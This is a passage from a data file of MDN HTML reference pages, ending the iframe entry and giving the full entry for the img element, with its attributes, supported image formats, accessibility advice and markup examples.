`&amp;amp;`.\n- Replace any double quotes (`\"`) with `&quot;` to prevent the `srcdoc` attribute from being prematurely terminated (if you use `'` instead, then you should replace `'` with `&apos;` instead). This step happens after the previous one, so `&quot;` generated in this step doesn't become `&amp;quot;`.\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), embedded content, interactive content, palpable content.                                                                                                                                                                                                                                                                                                                                  |\n| Permitted content                           | None.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tags are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| Permitted parents                           | Any element that accepts embedded content.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| Permitted ARIA roles                        | [`application`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/application_role), [`document`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/document_role), [`img`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/img_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) |\n| DOM interface                               | [`HTMLIFrameElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement)                                                                                                                                                                                                                                                                                                                                                                                                                 |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [CSP: frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)\n- [Privacy, permissions, and information security](https://developer.mozilla.org/en-US/docs/Web/Privacy)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)"
- name: img
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<img\\>: The Image Embed element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fimg&level=high)\n\nThe `<img>` [HTML](../index) element embeds an image into the document.\n\n## Try it\n\n#### HTML Demo: \\<img\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <img\n      class=\"fit-picture\"\n      src=\"/media/cc0-images/grapefruit-slice-332-332.jpg\"\n      alt=\"Grapefruit slice atop a pile of other slices\" />\n\n    .fit-picture {\n      width: 250px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe above example shows usage of the `<img>` element:\n\n- The `src` attribute is **required**, and contains the path to the image you want to embed.\n- The `alt` attribute holds a textual replacement for the image, which is mandatory and **incredibly useful** for accessibility — screen readers read the attribute value out to their users so they know what the image means. Alt text is also displayed on the page if the image can't be loaded for some reason: for example, network errors, content blocking, or linkrot.\n\nThere are many other attributes to achieve various purposes:\n\n- [Referrer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)/[CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) control for security and privacy: see [`crossorigin`](#crossorigin) and [`referrerpolicy`](#referrerpolicy).\n- Use both [`width`](#width) and [`height`](#height) to set the intrinsic size of the image, allowing it to take up space before it loads, to mitigate content layout shifts.\n- Responsive image hints with [`sizes`](#sizes) and [`srcset`](#srcset) (see also the [`<picture>`](picture) element and our [Responsive images](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images) tutorial).\n\n## Supported image formats\n\nThe HTML standard doesn't list what image formats to support, so [user agents](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may support different formats.\n\n**Note:** The [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types) provides comprehensive information about image formats and their web browser support. This section is just a summary!\n\nThe image file formats that are most commonly used on the web are:\n\n- [APNG (Animated Portable Network Graphics)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#apng_animated_portable_network_graphics) — Good choice for lossless animation sequences (GIF is less performant)\n- [AVIF (AV1 Image File Format)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#avif_image) — Good choice for both images and animated images due to high performance.\n- [GIF (Graphics Interchange Format)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#gif_graphics_interchange_format) — Good choice for *simple* images and animations.\n- [JPEG (Joint Photographic Expert Group image)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#jpeg_joint_photographic_experts_group_image) — Good choice for lossy compression of still images (currently the most popular).\n- [PNG (Portable Network Graphics)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#png_portable_network_graphics) — Good choice for lossless compression of still images (slightly better quality than JPEG).\n- [SVG (Scalable Vector Graphics)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#svg_scalable_vector_graphics) — Vector image format. Use for images that must be drawn accurately at different sizes.\n- [WebP (Web Picture format)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#webp_image) — Excellent choice for both images and animated images\n\nFormats like [WebP](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#webp_image) and [AVIF](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#avif_image) are recommended as they perform much better than PNG, JPEG, GIF for both still and animated images.\n\nSVG remains the recommended format for images that must be drawn accurately at different sizes.\n\n## Image loading errors\n\nIf an error occurs while loading or rendering an image, and an `onerror` event handler has been set for the [`error`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/error_event) event, that event handler will get called. This can happen in several situations, including:\n\n- The `src` attribute is empty (`\"\"`) or `null`.\n- The `src` [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL) is the same as the URL of the page the user is currently on.\n- The image is corrupted in some way that prevents it from being loaded.\n- The image's metadata is corrupted in such a way that it's impossible to retrieve its dimensions, and no dimensions were specified in the `<img>` element's attributes.\n- The image is in a format not supported by the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent).\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`alt`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/alt#usage_notes)  \nDefines text that can replace the image in the page.\n\n**Note:** Browsers do not always display images. There are a number of situations in which a browser might not display images, such as:\n\n- Non-visual browsers (such as those used by people with visual impairments)\n- The user chooses not to display images (saving bandwidth, privacy reasons)\n- The image is invalid or an [unsupported type](#supported_image_formats)\n\nIn these cases, the browser may replace the image with the text in the element's `alt` attribute. For these reasons and others, provide a useful value for `alt` whenever possible.\n\nSetting this attribute to an empty string (`alt=\"\"`) indicates that this image is *not* a key part of the content (it's decoration or a tracking pixel), and that non-visual browsers may omit it from [rendering](https://developer.mozilla.org/en-US/docs/Glossary/Engine/Rendering). Visual browsers will also hide the broken image icon if the `alt` attribute is empty and the image failed to display.\n\nThis attribute is also used when copying and pasting the image to text, or saving a linked image to a bookmark.\n\n[`attributionsrc`](#attributionsrc) Experimental  \nspecifies that you want the browser to send an [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header along with the image request.\n\nOn the server-side this is used to trigger sending an [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) or [`Attribution-Reporting-Register-Trigger`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Trigger) header in the response, to register an image-based [attribution source](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API/Registering_sources#html-based_event_sources) or [attribution trigger](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API/Registering_triggers#html-based_attribution_triggers), respectively. Which response header should be sent back depends on the value of the `Attribution-Reporting-Eligible` header that triggered the registration.\n\nThe corresponding source or trigger event is set off once the browser receives the response containing the image file.\n\n**Note:** See the [Attribution Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API) for more details.\n\nThere are two versions of this attribute that you can set:\n\n- Boolean, i.e. just the `attributionsrc` name. This specifies that you want the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header sent to the same server as the `src` attribute points to. This is fine when you are handling the attribution source or trigger registration on the same server. When registering an attribution trigger this property is optional, and a boolean value will be used if it is omitted.\n- Value containing one or more URLs, for example:\n\nhtml\n\n```\n<img\n  src=\"image-file.png\"\n  alt=\"My image file description\"\n  attributionsrc=\"https://a.example/register-source\n                     https://b.example/register-source\" />\n```\n\nThis is useful in cases where the requested resource is not on a server you control, or you just want to handle registering the attribution source on a different server. In this case, you can specify one or more URLs as the value of `attributionsrc`. When the resource request occurs the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header will be sent to the URL(s) specified in `attributionSrc` in addition to the resource origin. These URLs can then respond with a [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) or [`Attribution-Reporting-Register-Trigger`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Trigger) header as appropriate to complete registration.\n\n**Note:** Specifying multiple URLs means that multiple attribution sources can be registered on the same feature. You might for example have different campaigns that you are trying to measure the success of, which involve generating different reports on different data.\n\n[`crossorigin`](../attributes/crossorigin)  \nIndicates if the fetching of the image must be done using a [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) request. Image data from a [CORS-enabled image](../cors_enabled_image) returned from a CORS request can be reused in the [`<canvas>`](canvas) element without being marked \"[tainted](../cors_enabled_image#security_and_tainted_canvases)\".\n\nIf the `crossorigin` attribute is *not* specified, then a non-CORS request is sent (without the [`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) request header), and the browser marks the image as tainted and restricts access to its image data, preventing its usage in [`<canvas>`](canvas) elements.\n\nIf the `crossorigin` attribute *is* specified, then a CORS request is sent (with the [`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) request header); but if the server does not opt into allowing cross-origin access to the image data by the origin site (by not sending any [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) response header, or by not including the site's origin in any [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) response header it does send), then the browser blocks the image from loading, and logs a CORS error to the devtools console.\n\nAllowed values:\n\n[`anonymous`](#anonymous)  \nA CORS request is sent with credentials omitted (that is, no [cookies](https://developer.mozilla.org/en-US/docs/Glossary/Cookie), [X.509 certificates](https://datatracker.ietf.org/doc/html/rfc5280), or [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) request header).\n\n[`use-credentials`](#use-credentials)  \nThe CORS request is sent with any credentials included (that is, cookies, X.509 certificates, and the `Authorization` request header). If the server does not opt into sharing credentials with the origin site (by sending back the `Access-Control-Allow-Credentials: true` response header), then the browser marks the image as tainted and restricts access to its image data.\n\nIf the attribute has an invalid value, browsers handle it as if the `anonymous` value was used. See [CORS settings attributes](../attributes/crossorigin) for additional information.\n\n[`decoding`](#decoding)  \nThis attribute provides a hint to the browser as to whether it should perform image decoding along with rendering the other DOM content in a single presentation step that looks more \"correct\" (`sync`), or render and present the other DOM content first and then decode the image and present it later (`async`). In practice, `async` means that the next paint does not wait for the image to decode.\n\nIt is often difficult to perceive any noticeable effect when using `decoding` on static `<img>` elements. They'll likely be initially rendered as empty images while the image files are fetched (either from the network or from the cache) and then handled independently anyway, so the \"syncing\" of content updates is less apparent. However, the blocking of rendering while decoding happens, while often quite small, *can* be measured — even if it is difficult to observe with the human eye. See [What does the image decoding attribute actually do?](https://www.tunetheweb.com/blog/what-does-the-image-decoding-attribute-actually-do/) for a more detailed analysis (tunetheweb.com, 2023).\n\nUsing different `decoding` types can result in more noticeable differences when dynamically inserting `<img>` elements into the DOM via JavaScript — see [`HTMLImageElement.decoding`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decoding) for more details.\n\nAllowed values:\n\n[`sync`](#sync)  \nDecode the image synchronously along with rendering the other DOM content, and present everything together.\n\n[`async`](#async)  \nDecode the image asynchronously, after rendering and presenting the other DOM content.\n\n[`auto`](#auto)  \nNo preference for the decoding mode; the browser decides what is best for the user. This is the default value.\n\n[`elementtiming`](../attributes/elementtiming)  \nMarks the image for observation by the [`PerformanceElementTiming`](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming) API. The value given becomes an identifier for the observed image element. See also the [`elementtiming`](../attributes/elementtiming) attribute page.\n\n[`fetchpriority`](#fetchpriority)  \nProvides a hint of the relative priority to use when fetching the image. Allowed values:\n\n[`high`](#high)  \nSignals a high-priority fetch relative to other images.\n\n[`low`](#low)  \nSignals a low-priority fetch relative to other images.\n\n[`auto`](#auto_2)  \nDefault: Signals automatic determination of fetch priority relative to other images.\n\n[`height`](#height)  \nThe intrinsic height of the image, in pixels. Must be an integer without a unit.\n\n**Note:** Including `height` and [`width`](#width) enables the [aspect ratio](https://developer.mozilla.org/en-US/docs/Glossary/Aspect_ratio) of the image to be calculated by the browser prior to the image being loaded. This aspect ratio is used to reserve the space needed to display the image, reducing or even preventing a layout shift when the image is downloaded and painted to the screen. Reducing layout shift is a major component of good user experience and web performance.\n\n[`ismap`](#ismap)  \nThis Boolean attribute indicates that the image is part of a [server-side map](https://en.wikipedia.org/wiki/Image_map#Server-side). If so, the coordinates where the user clicked on the image are sent to the server.\n\n**Note:** This attribute is allowed only if the `<img>` element is a descendant of an [`<a>`](a) element with a valid [`href`](a#href) attribute. This gives users without pointing devices a fallback destination.\n\n[`loading`](#loading)  \nIndicates how the browser should load the image:\n\n[`eager`](#eager)  \nLoads the image immediately, regardless of whether or not the image is currently within the visible viewport (this is the default value).\n\n[`lazy`](#lazy)  \nDefers loading the image until it reaches a calculated distance from the viewport, as defined by the browser. The intent is to avoid the network and storage bandwidth needed to handle the image until it's reasonably certain that it will be needed. This generally improves the performance of the content in most typical use cases.\n\n**Note:** Loading is only deferred when JavaScript is enabled. This is an anti-tracking measure, because if a user agent supported lazy loading when scripting is disabled, it would still be possible for a site to track a user's approximate scroll position throughout a session, by strategically placing images in a page's markup such that a server can track how many images are requested and when.\n\n**Note:** Images with `loading` set to `lazy` will never be loaded if they do not intersect a visible part of an element, even if loading them would change that as unloaded images have a `width` and `height` of `0`. Putting `width` and `height` on lazyloaded images fixes this issue and is a best practice, [recommended by the specification](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element). Doing so also helps prevent layout shifts.\n\n[`referrerpolicy`](#referrerpolicy)  \nA string indicating which referrer to use when fetching the resource:\n\n- `no-referrer`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n- `no-referrer-when-downgrade`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent to [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin)s without [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) ([HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS)).\n- `origin`: The sent referrer will be limited to the origin of the referring page: its [scheme](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), [host](https://developer.mozilla.org/en-US/docs/Glossary/Host), and [port](https://developer.mozilla.org/en-US/docs/Glossary/Port).\n- `origin-when-cross-origin`: The referrer sent to other origins will be limited to the scheme, the host, and the port. Navigations on the same origin will still include the path.\n- `same-origin`: A referrer will be sent for [same origin](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy), but cross-origin requests will contain no referrer information.\n- `strict-origin`: Only send the origin of the document as the referrer when the protocol security level stays the same (HTTPS→HTTPS), but don't send it to a less secure destination (HTTPS→HTTP).\n- `strict-origin-when-cross-origin` (default): Send a full URL when performing a same-origin request, only send the origin when the protocol security level stays the same (HTTPS→HTTPS), and send no header to a less secure destination (HTTPS→HTTP).\n- `unsafe-url`: The referrer will include the origin *and* the path (but not the [fragment](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/hash), [password](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/password), or [username](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/username)). **This value is unsafe**, because it leaks origins and paths from TLS-protected resources to insecure origins.\n\n[`sizes`](#sizes)  \nOne or more strings separated by commas, indicating a set of source sizes. Each source size consists of:\n\n1.  A [media condition](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries#syntax). This must be omitted for the last item in the list.\n2.  A source size value.\n\nMedia Conditions describe properties of the *viewport*, not of the *image*. For example, `(max-height: 500px) 1000px` proposes to use a source of 1000px width, if the *viewport* is not higher than 500px.\n\nSource size values specify the intended display size of the image. [User agents](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) use the current source size to select one of the sources supplied by the `srcset` attribute, when those sources are described using width (`w`) descriptors. The selected source size affects the [intrinsic size](https://developer.mozilla.org/en-US/docs/Glossary/Intrinsic_Size) of the image (the image's display size if no [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) styling is applied). If the `srcset` attribute is absent, or contains no values with a width descriptor, then the `sizes` attribute has no effect.\n\n[`src`](#src)  \nThe image [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL). Mandatory for the `<img>` element. On [browsers](https://developer.mozilla.org/en-US/docs/Glossary/Browser) supporting `srcset`, `src` is treated like a candidate image with a pixel density descriptor `1x`, unless an image with this pixel density descriptor is already defined in `srcset`, or unless `srcset` contains `w` descriptors.\n\n[`srcset`](#srcset)  \nOne or more strings separated by commas, indicating possible image sources for the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) to use. Each string is composed of:\n\n1.  A [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL) to an image\n2.  Optionally, whitespace followed by one of:\n    - A width descriptor (a positive integer directly followed by `w`). The width descriptor is divided by the source size given in the `sizes` attribute to calculate the effective pixel density.\n    - A pixel density descriptor (a positive floating point number directly followed by `x`).\n\nIf no descriptor is specified, the source is assigned the default descriptor of `1x`.\n\nIt is incorrect to mix width descriptors and pixel density descriptors in the same `srcset` attribute. Duplicate descriptors (for instance, two sources in the same `srcset` which are both described with `2x`) are also invalid.\n\nIf the `srcset` attribute uses width descriptors, the `sizes` attribute must also be present, or the `srcset` itself will be ignored.\n\nThe user agent selects any of the available sources at its discretion. This provides them with significant leeway to tailor their selection based on things like user preferences or [bandwidth](https://developer.mozilla.org/en-US/docs/Glossary/Bandwidth) conditions. See our [Responsive images](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images) tutorial for an example.\n\n[`width`](#width)  \nThe intrinsic width of the image in pixels. Must be an integer without a unit.\n\n[`usemap`](#usemap)  \nThe partial [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL) (starting with `#`) of an [image map](map) associated with the element.\n\n**Note:** You cannot use this attribute if the `<img>` element is inside an [`<a>`](a) or [`<button>`](button) element.\n\n### Deprecated attributes\n\n[`align`](#align) Deprecated  \nAligns the image with its surrounding context. Use the [`float`](https://developer.mozilla.org/en-US/docs/Web/CSS/float) and/or [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) properties instead of this attribute. Allowed values:\n\n[`top`](#top)  \nEquivalent to `vertical-align: top` or `vertical-align: text-top`\n\n[`middle`](#middle)  \nEquivalent to `vertical-align: -moz-middle-with-baseline`\n\n[`bottom`](#bottom)  \nThe default, equivalent to `vertical-align: unset` or `vertical-align: initial`\n\n[`left`](#left)  \nEquivalent to `float: left`\n\n[`right`](#right)  \nEquivalent to `float: right`\n\n[`border`](#border) Deprecated  \nThe width of a border around the image. Use the [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) property instead.\n\n[`hspace`](#hspace) Deprecated  \nThe number of pixels of white space on the left and right of the image. Use the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) CSS property instead.\n\n[`longdesc`](#longdesc) Deprecated  \nA link to a more detailed description of the image. Possible values are a [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL) or an element [`id`](../global_attributes#id).\n\n**Note:** This attribute is mentioned in the latest [W3C](https://developer.mozilla.org/en-US/docs/Glossary/W3C) version, [HTML 5.2](https://html.spec.whatwg.org/multipage/obsolete.html#element-attrdef-img-longdesc), but has been removed from the [WHATWG](https://developer.mozilla.org/en-US/docs/Glossary/WHATWG)'s [HTML Living Standard](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element). It has an uncertain future; authors should use a [WAI](https://developer.mozilla.org/en-US/docs/Glossary/WAI)-[ARIA](https://developer.mozilla.org/en-US/docs/Glossary/ARIA) alternative such as [`aria-describedby`](https://www.w3.org/TR/wai-aria-1.1/#aria-describedby) or [`aria-details`](https://www.w3.org/TR/wai-aria-1.1/#aria-details).\n\n[`name`](#name) Deprecated  \nA name for the element. Use the [`id`](../global_attributes#id) attribute instead.\n\n[`vspace`](#vspace) Deprecated  \nThe number of pixels of white space above and below the image. Use the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) CSS property instead.\n\n## Styling with CSS\n\n`<img>` is a [replaced element](https://developer.mozilla.org/en-US/docs/Web/CSS/Replaced_element); it has a [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value of `inline` by default, but its default dimensions are defined by the embedded image's intrinsic values, like it were `inline-block`. You can set properties like [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border)/[`border-radius`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-radius), [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding)/[`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin), [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width), [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height), etc. on an image.\n\n`<img>` has no baseline, so when images are used in an inline formatting context with [`vertical-align: baseline`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align), the bottom of the image will be placed on the text baseline.\n\nYou can use the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property to position the image within the element's box, and the [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property to adjust the sizing of the image within the box (for example, whether the image should fit the box or fill it even if clipping is required).\n\nDepending on its type, an image may have an intrinsic width and height. For some image types, however, intrinsic dimensions are unnecessary. [SVG](https://developer.mozilla.org/en-US/docs/Glossary/SVG) images, for instance, have no intrinsic dimensions if their root [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg) element doesn't have a `width` or `height` set on it.\n\n## Accessibility\n\n### Authoring meaningful alternate descriptions\n\nAn `alt` attribute's value should provide a clear and concise text replacement for the image's content. It should not describe the presence of the image itself or the file name of the image. If the `alt` attribute is purposefully left off because the image has no textual equivalent, consider alternate methods to present what the image is trying to communicate.\n\n#### Don't\n\nhtml\n\n```\n<img alt=\"image\" src=\"penguin.jpg\" />\n```\n\n#### Do\n\nhtml\n\n```\n<img alt=\"A Rockhopper Penguin is standing on a beach.\" src=\"penguin.jpg\" />\n```\n\nWhen an `alt` attribute is not present on an image, some screen readers may announce the image's file name instead. This can be a confusing experience if the file name isn't representative of the image's contents.\n\n- [An alt Decision Tree • Images • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/images/decision-tree/)\n- [Alt-texts: The Ultimate Guide — Axess Lab](https://axesslab.com/alt-texts/)\n- [How to Design Great Alt Text: An Introduction \\| Deque](https://www.deque.com/blog/great-alt-text-introduction/)\n- [MDN Understanding WCAG, Guideline 1.1 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.1_%E2%80%94_providing_text_alternatives_for_non-text_content)\n- [Understanding Success Criterion 1.1.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/text-equiv-all.html)\n\n### Identifying SVG as an image\n\nDue to a [VoiceOver bug](https://webkit.org/b/216364), VoiceOver does not correctly announce SVG images as images. Include [`role=\"img\"`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/img_role) to all `<img>` elements with SVG source files to ensure assistive technologies correctly announce the SVG as image content.\n\nhtml\n\n```\n<img src=\"mdn.svg\" alt=\"MDN\" role=\"img\" />\n```\n\n### The title attribute\n\nThe [`title`](../global_attributes#title) attribute is not an acceptable substitute for the `alt` attribute. Additionally, avoid duplicating the `alt` attribute's value in a `title` attribute declared on the same image. Doing so may cause some screen readers to announce the same text twice, creating a confusing experience.\n\nThe `title` attribute should also not be used as supplemental captioning information to accompany an image's `alt` description. If an image needs a caption, use the [`figure`](figure) and [`figcaption`](figcaption) elements.\n\nThe value of the `title` attribute is usually presented to the user as a tooltip, which appears shortly after the cursor stops moving over the image. While this *can* provide additional information to the user, you should not assume that the user will ever see it: the user may only have keyboard or touchscreen. If you have information that's particularly important or valuable for the user, present it inline using one of the methods mentioned above instead of using `title`.\n\n- [Using the HTML title attribute – updated \\| The Paciello Group](https://www.tpgi.com/using-the-html-title-attribute-updated/)\n\n## Examples\n\n### Alternative text\n\nThe following example embeds an image into the page and includes alternative text for accessibility.\n\nhtml\n\n```\n<img src=\"favicon144.png\" alt=\"MDN\" />\n```\n\n### Image link\n\nThis example builds upon the previous one, showing how to turn the image into a link. To do so, nest the `<img>` tag inside the [`<a>`](a). You should make the alternative text describe the resource the link is pointing to, as if you were using a text link instead.\n\nhtml\n\n```\n<a href=\"https://developer.mozilla.org\">\n  <img src=\"favicon144.png\" alt=\"Visit the MDN site\" />\n</a>\n```\n\n### Using the srcset attribute\n\nIn this example we include a `srcset` attribute with a reference to a high-resolution version of the logo; this will be loaded instead of the `src` image on high-resolution devices. The image referenced in the `src` attribute is counted as a `1x` candidate in [user agents](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) that support `srcset`.\n\nhtml\n\n```\n<img src=\"favicon72.png\" alt=\"MDN\" srcset=\"favicon144.png 2x\" />\n```\n\n### Using the srcset and sizes attributes\n\nThe `src` attribute is ignored in [user agents](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) that support `srcset` when `w` descriptors are included. When the `(max-width: 600px)` media condition matches, the 200 pixel-wide image will load (it is the one that matches `200px` most closely), otherwise the other image will load.\n\nhtml\n\n```\n<img\n  src=\"clock-demo-200px.png\"\n  alt=\"The time is 12:45.\"\n  srcset=\"clock-demo-200px.png 200w, clock-demo-400px.png 400w\"\n  sizes=\"(max-width: 600px) 200px, 50vw\" />\n```\n\n**Note:** To see the resizing in action, [view the example on a separate page](https://live.mdnplay.dev/en-US/docs/Web/HTML/Element/img/_sample_.Using_the_srcset_and_sizes_attributes.html?id=Using_the_srcset_and_sizes_attributes&amp;url=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fimg), so you can actually resize the content area.\n\n## Security and privacy concerns\n\nAlthough `<img>` elements have innocent uses, they can have undesirable consequences for user security and privacy. See [Referer header: privacy and security concerns](https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns) for more information and mitigations.\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<picture>`](picture), [`<object>`](object), and [`<embed>`](embed) elements\n- [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit), [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position), [`image-orientation`](https://developer.mozilla.org/en-US/docs/Web/CSS/image-orientation), [`image-rendering`](https://developer.mozilla.org/en-US/docs/Web/CSS/image-rendering), and [`image-resolution`](https://developer.mozilla.org/en-US/docs/Web/CSS/image-resolution): Image-related CSS properties.\n- [`HTMLImageElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) interface for this element\n- [Images in HTML](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Images_in_HTML)\n- [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types)\n- [Responsive images](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img)"
- name: inert (attribute)
